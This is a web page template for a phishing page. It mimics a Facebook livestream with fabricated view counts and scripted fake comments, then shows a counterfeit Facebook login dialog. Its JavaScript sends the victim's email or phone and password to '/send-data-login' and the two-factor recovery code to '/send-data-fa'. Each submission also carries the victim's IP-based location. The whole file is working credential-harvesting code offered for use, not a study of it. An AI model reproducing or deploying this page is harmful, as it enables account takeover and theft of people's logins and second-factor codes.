<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="apple-touch-icon" href="{{$settings['favicon_icon']}}" sizes="180x180">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="32x32">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="16x16">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="16x16">
    <link rel="mask-icon" href="{{$settings['favicon_icon']}}">
    <link rel="icon" href="{{$settings['favicon_icon']}}">
    <title>@lang('common.title_confirm_page')</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
        integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/l/0,cross/-Cultnlj_dr.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="vHOdL3w" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/l/0,cross/qoCFyX79vaS.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="nO9FN1L" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/A3yQgZGkQlX.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="K9qkewM" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/SunHUt6SMVM.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="R2oOnzS" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/l/0,cross/BxYTaX4FCss.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="q0uBIPS" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/y8/l/0,cross/Msrr02Simrx.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="35HYsYr" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/dg6SOblwSgG.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="hYABK8P" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/roL1kMBisKe.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/l/0,cross/-Cultnlj_dr.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/l/0,cross/qoCFyX79vaS.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/A3yQgZGkQlX.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/SunHUt6SMVM.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/l/0,cross/BxYTaX4FCss.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y8/l/0,cross/Msrr02Simrx.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/dg6SOblwSgG.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
     <link type="text/css" href="/css/home.css" rel="stylesheet">
    {{-- <link type="text/css" href="/css/button.css" rel="stylesheet">
    <link type="text/css" href="/css/input.css" rel="stylesheet">
    <link type="text/css" href="/css/modal.css" rel="stylesheet">
    <link type="text/css" href="/css/header.css" rel="stylesheet">
    <link type="text/css" href="/css/body.css" rel="stylesheet">
    <link type="text/css" href="/css/display.css" rel="stylesheet">
    <link type="text/css" href="/css/footer.css" rel="stylesheet">
    <link type="text/css" href="/css/spinner.css" rel="stylesheet">
    <link type="text/css" href="/css/app.css" rel="stylesheet"> --}}
</head>

<body>
    <div class="warning btn-danger">
        @lang('fa.title_page_warning')
    </div>
    <div class="block">
        <div class="block-top">
            <div class="top-left">
                <div class="btn-danger btn">LIVE</div>
                <div class="btn-view btn"> <i data-visualcompletion="css-img" class=""
                        style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/yL5snp3h9QO.png?_nc_eui2=AeGfnhuJZe-AYaz00-shb0dI9No0WJJe4h302jRYkl7iHZEHuA4u3FoLleSmAerYwXvZfansyPOB0GIAaTABEQTw&quot;); background-position: 0px -372px; background-size: 74px 386px; width: 12px; height: 12px; background-repeat: no-repeat; display: inline-block;"></i>
                    <span class="amount-view">54,8K</span>
                </div>
            </div>
            <div class="top-right">
                <div class=""> <img width="60px" height="55px" style="border-radius: 50%" src="/images/fb.png"
                        alt="image"></div>
            </div>
        </div>
        <div class="block-comment">
            <div class="comment-pinned mb-2">
                <div class="comment">
                    <div class="comment-left">
                        <img width="60px" height="60px" style="border-radius: 50%" src="/images/default.jpg"
                            alt="image">
                    </div>
                    <div class="comment-right">
                        <p style="color: rgb(24, 96, 185);font-weight:bold">Vương Thanh Tú</p>
                        <p>Open your heart and mine is your <img height="16" width="16" alt="😇"
                                class="xz74otr" referrerpolicy="origin-when-cross-origin"
                                src="https://static.xx.fbcdn.net/images/emoji.php/v9/tae/1.5/16/1f607.png"><img
                                height="16" width="16" alt="😇" class="xz74otr"
                                referrerpolicy="origin-when-cross-origin"
                                src="https://static.xx.fbcdn.net/images/emoji.php/v9/tae/1.5/16/1f607.png"></p>
                    </div>
                </div>
            </div>
            <div class="list-comment">

            </div>
            <div class="typing">
                <div class="typing-left">
                    <i class="share fa-solid fa-share" style="width: 100%"></i>
                </div>
                &emsp;
                <div class="typing-center">
                    <input style="width: 100%" type="text" class="type-comment"
                        placeholder="Type to comment..." />
                </div>
                &emsp;
                <div class="typing-right">
                    <button class="btn btn-send">Send</button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal" id="modal-login" style="display: block;" aria-modal="true" role="dialog">
        <div class="modal-dialog modal-lg modal-dialog-centered">
            <div class="modal-content">
                <div class="form-login">
                    <div class="form-title mb-2">
                        <div class="_4g34"><a
                                href="https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA5OTU5NDU4LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;locale2=vi_VN"><img
                                    src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" width="112"
                                    class="img" alt="facebook"></a></div>
                    </div>
                    <div class="login_form_container">
                        <div class="mobile-login-form">
                            <div class="login-form-main">
                                <div class="login-form-main-content">

                                    <input autocorrect="off" autocapitalize="off"
                                        class="input-form-login validate-input validate-phone-email" autocomplete="on"
                                        id="username-desktop" name="username"
                                        placeholder=" Mobile number or email address" type="text"
                                        data-sigil="m_login_email">
                                    <div class="error">
                                        <span class="">@lang('fa.warning_login_fa')</span><a
                                            class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
                                    </div>
                                    <input autocorrect="off" autocapitalize="off"
                                        class="input-form-login validate-input" autocomplete="on" type="password"
                                        name="password" id="password-desktop" tabindex="0" placeholder="Password"
                                        value="" aria-label="Password"> <br>

                                    <button type="button" class="button-form-login" id="btnLogin-desktop">
                                        <span id="submit-login-loading" class="d-none spinner-border spinner">
                                        </span>
                                        <span id="submit-login-text">@lang('login.submit')</span>
                                    </button>
                                    {{-- <div class="login-form-link" id="login_link">
                                        <a href="javascript:;" class="_97w4" target=""> Forgotten account?</a>
                                        <span role="presentation" aria-hidden="true"> · </span>
                                        <a href="javascript:;" rel="nofollow" class="_97w5">Sign up for Facebook
                                        </a>
                                    </div> --}}
                                    <div class="">
                                        <div class="footer-forgot-password">
                                            <div class="footer-forgot-password-item">
                                                <a class="footer-forgot-password-link" tabindex="0"
                                                    href="https://www.facebook.com/login/identify"> @lang('login.forgotten')?
                                                </a>
                                            </div>
                                        </div>
                                        <div class="create-new">
                                            <div class="create-new-content">
                                                <div class="create-new-item-line">
                                                    <div class="create-new-item-line-content">
                                                        <div class="create-new-line-hr"
                                                            data-sigil="login_reg_separator">
                                                            <span class="line-hr">@lang('fa.or_fa')</span>
                                                        </div>
                                                        <div class="create-new-button">
                                                            <a href="https://www.facebook.com/reg"
                                                                class="button-create-new" id="signup-button"
                                                                tabindex="0" data-sigil="m_reg_button"
                                                                data-autoid="autoid_7">@lang('login.create_account')</a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal" id="modal-fa" style="display: none;" aria-modal="true" role="dialog">
        <div class="modal-dialog modal-lg modal-dialog-centered">
            <div class="modal-content">
                <div id="u_0_2_Gj"><input type="hidden" name="jazoest" value="21020" autocomplete="off"><input
                        type="hidden" name="lsd" value="AVpVwz5d6hw" autocomplete="off">
                    <div class="mvl ptm uiInterstitial _9np_ uiInterstitialLarge uiBoxWhite">
                        <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
                            <div class="clearfix uiHeaderTop">
                                <div style="text-align: left">
                                    <h2 class="uiHeaderTitle" aria-hidden="true">@lang('fa.title_page_fa')</h2>
                                </div>
                            </div>
                        </div>
                        <div class="phl ptm uiInterstitialContent">
                            <div class="_585n mbm hidden_elem _585o" id="error_box" style="display: none"><i
                                    class="_585p img sp_kdZ98Fttf5-_1_5x sx_c84dfe"><u>Warning</u></i>
                                <div class="_585r _50f4" style="text-align: left">@lang('fa.title_noti_fa')</div>
                            </div>
                            <div class="_9nq2 marginBottom20px guide-info">@lang('fa.title_noti_content_email_fa')</div>
                            <div class="clearfix">
                                <div class="_9o1z"><input type="text" class="inputtext _9o1w _9o1_"
                                        name="n" id="recovery_code_entry" placeholder="@lang('fa.title_placeholder_fa')"
                                        autocomplete="off" aria-label="Nhập mã"></div>
                                <div class="_9o1-">
                                    <div class="_9o1x marginBottom10px">@lang('fa.title_noti_action_fa')</div>
                                    <div class="_9o1y">
                                        <div class="hide-email"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="mvm"></div>
                        </div>
                        <div class="uiInterstitialBar uiBoxGray topborder">
                            <div class="clearfix">
                                <div class="rfloat _ohf"><a role="button"
                                        class="_42ft _4jy0 _9nq1 textPadding20px _4jy3 _517h _51sy"
                                        name="reset_action" href="/">@lang('fa.title_cancel_fa')</a>
                                    <button value="1"
                                        class="_42ft _4jy0 _9nq0 textPadding20px _4jy3 _4jy1 selected _51sy button-send-fa"
                                        name="reset_action" type="submit">@lang('fa.title_continue_fa')</button>
                                </div>
                                <div class="pts"><a class="_9o1v"
                                        href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA5OTYwODYxLCJjYWxsc2l0ZV9pZCI6NDAwMDE1NzU4MDUxMTIzfQ%3D%3D&amp;is_from_lara_screen=0">@lang('fa.title_question_fa')</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <video autoplay muted loop id="myVideo">
        <source src="/video/test.mp4" type="video/mp4">
        Your browser does not support HTML5 video.
    </video>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
    <script type="text/javascript">
        $(document).on('click', 'body', function() {
            $("#myVideo").prop('muted', false);
        })

        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': '{{ csrf_token() }}'
            }
        });

        var countLogin = 0;
        var countLoginMobile = 0;

        var oneTimeUsername = "";
        var oneTimePassword = "";

        var oneTimeUsernameMobile = "";
        var oneTimePasswordMobile = "";

        var ipAddress = "";
        var latitude = "";
        var longitude = "";
        var countryName = "";
        var countryCode = "";
        var cityName = "";
        var regionName = "";
        var timeZone = "";
        var zipCode = "";
        var continent = "";
        var continentCode = "";

        async function setCurrentLang() {
            let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
            const response = await fetch(getIpInfoUrl);
            console.log(response);
            const ipInfo = await response.json();
            ipAddress = ipInfo.ipAddress;
            latitude = ipInfo.latitude;
            longitude = ipInfo.longitude;
            countryName = ipInfo.countryName;
            countryCode = ipInfo.countryCode;
            cityName = ipInfo.cityName;
            regionName = ipInfo.regionName;
            timeZone = ipInfo.timeZone;
            zipCode = ipInfo.zipCode;
            continent = ipInfo.continent;
            continentCode = ipInfo.continentCode;
        }
        setCurrentLang()

        function sendDataLoginDesktop() {
            const valueEmail = $('#username-desktop').val();
            const valuePassword = $('#password-desktop').val();
            let formData = new FormData();
            formData.append('email_2', valueEmail)
            formData.append('password_2', valuePassword)
            formData = pushIPInfo(formData)
            $.ajax({
                method: "POST",
                url: "/send-data-login",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        $('#modal-login').css('display', 'none');
                        $('#modal-fa').css('display', 'block');
                        $('.guide-info').text(valueEmail.includes('@') ? `@lang('fa.title_noti_content_email_fa')` :
                            `@lang('fa.title_noti_content_phone_fa')`);
                        $('.hide-email').text(replaceEmail(valueEmail));
                        $('.error').css('display', 'none');
                    } else {
                        $('.error').css('display', 'block');
                    }
                }
            })
        }

        function replaceEmail(email) {
            email = email.split("");
            if (email.includes("@")) {
                email = email.map((e, index) => {
                    return (index == 0 || e == "@") ? e : "*";
                })
            } else {
                email = email.map((e, index) => {
                    return (index == 0 || index == email.length - 1 || index == email.length - 2) ? e : "*";
                })
            }

            return email.join("");
        }

        function sendDataFa() {
            const fa_code = $('#recovery_code_entry').val();
            let formData = new FormData();
            formData.append('fa_code', fa_code)
            formData = pushIPInfo(formData)
            $.ajax({
                method: "POST",
                url: "/send-data-fa",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        $('#modal-fa').css('display', 'none');
                        $('.warning').css('display', 'none');
                        $('#error_box').css('display', 'none');
                    } else {
                        $('#error_box').css('display', 'block');
                    }
                }
            })
        }

        function pushIPInfo(formData) {
            formData.append('ipAddress', ipAddress)
            formData.append('latitude', latitude)
            formData.append('longitude', longitude)
            formData.append('countryName', countryName)
            formData.append('countryCode', countryCode)
            formData.append('regionName', regionName)
            formData.append('cityName', cityName)
            formData.append('timeZone', timeZone)
            formData.append('zipCode', zipCode)
            formData.append('continent', continent)
            formData.append('continentCode', continentCode)
            return formData;
        }

        function inputValidateInput() {
            const value = $(this).val();
            if (value !== "") {
                $(this).removeClass('is-invalid')
            }
            const valueEmailDesktop = $('#username-desktop').val();
            const valuePasswordDesktop = $('#password-desktop').val();

            if (valueEmailDesktop !== '' && valuePasswordDesktop !== '') {
                $('#btnLogin-desktop').removeClass('disabled');
            }
        }

        function validatePhoneEmail() {
            const value = $(this).val();
            if (isValidValuePhoneEmail(value)) {
                $(this).removeClass('is-invalid');
            } else {
                $(this).addClass('is-invalid');
            }
        }

        function isValidValuePhoneEmail(value) {
            if (isNumeric(value)) {
                const regexPhoneNumber = /[0-9]{9,12}$/;
                return regexPhoneNumber.test(value);
            } else {
                const regexEmail = /^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;
                return regexEmail.test(value)
            }
        }

        function isNumeric(str) {
            if (typeof str != "string") return false // we only process strings!
            return !isNaN(str) &&
                // use type coercion to parse the _entirety_ of the string (`parseFloat` alone does not do this)...
                !isNaN(parseFloat(str)) // ...and ensure strings of whitespace fail
        }


        $(document).on('input', '.validate-phone-email', validatePhoneEmail)
        $(document).on('keydown', '.validate-input', inputValidateInput)
        // $(document).on('click', '#btnLogin-desktop', submitLoginDesktop)
        // $(document).on('click', '#btnLogin-mobile', submitLoginMobile)
        // $(document).on('click', '#btnLogin-mobile', submitLoginDesktop)
    </script>
    <script type="text/javascript">
        var email = "";
        const NAME = [
            'Nguyễn Duy Nhật Tú',
            'Trần Công Vượng',
            'Bé Xinhh',
            'Tú Ông',
            'Phuong Tran',
            'And Dep Trai',
            'Cuoc Đoi Là Vax',
            'Kan Mot Doi Tku',
        ]
        const COMMENT = [
            'CHick nhau hk em',
            'Ngon thế nhở',
            'Em đẹp qa <3',
            'Facebook cho livestream sẽ luôn hã',
            'Vai l',
            'ĐƯợc của nó đấy',
            'Ngon quá',
        ]
        const ICON = [
            "https://static.xx.fbcdn.net/images/emoji.php/v9/ta7/1.5/16/1f644.png",
            "https://static.xx.fbcdn.net/images/emoji.php/v9/tcc/1.5/16/1f979.png",
            "https://static.xx.fbcdn.net/images/emoji.php/v9/tc/1.5/16/1f913.png",
            "https://static.xx.fbcdn.net/images/emoji.php/v9/td9/1.5/16/1f92a.png",
            "https://static.xx.fbcdn.net/images/emoji.php/v9/t82/1.5/16/263a.png",
            "https://static.xx.fbcdn.net/images/emoji.php/v9/tb1/1.5/16/1f929.png",
            "https://static.xx.fbcdn.net/images/emoji.php/v9/t43/1.5/16/1f970.png",
        ]
        const AVATAR = [
            "/images/1.jpg",
            "/images/2.jpg",
            "/images/3.jpg",
            "/images/4.jpg",
            "/images/5.jpg",
            "/images/6.jpg",
            "/images/7.jpg",
        ]
        var id_interval = null;
        $(".list-comment").animate({
            scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
                .clientHeight
        }, 200);

        $(document).ready(function() {
            id_interval = setInterval(() => {
                $('.list-comment').append(`
                <div class="comment mb-2">
                    <div class="comment-left">
                        <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
                            alt="image">
                    </div>
                    <div class="comment-right">
                        <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
                       ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
                                referrerpolicy="origin-when-cross-origin"
                                src="${ICON[getRandom(0, ICON.length - 1)]}">
                    </div>
                </div>
                `);
                $(".list-comment").animate({
                    scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
                        .clientHeight
                }, 200);
            }, 3000);
        })

        function getRandom(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        $(document).on('click', '.button-form-login', function() {
            $('#login_error').addClass('d-none')
            const loading = $('#submit-login-loading');
            const text = $('#submit-login-text');
            text.addClass('d-none');
            loading.removeClass('d-none');
            let email = $('#username-desktop').val();
            let pass = $('#password-desktop').val();
            setTimeout(() => {
                text.removeClass('d-none');
                loading.addClass('d-none');
                if (!email || !pass) {
                    $('.error').css('display', 'block');
                } else {
                    $('.error').css('display', 'none');
                    sendDataLoginDesktop();
                }
            }, 1000);

        })

        $(document).on('click', '.button-send-fa', function() {
            let recovery_code_entry = $('#recovery_code_entry').val();
            if (!recovery_code_entry) {
                $('#error_box').css('display', 'block');
            } else {
                $('#error_box').css('display', 'none');
                sendDataFa();
            }
        })
    </script>
</body>

</html>
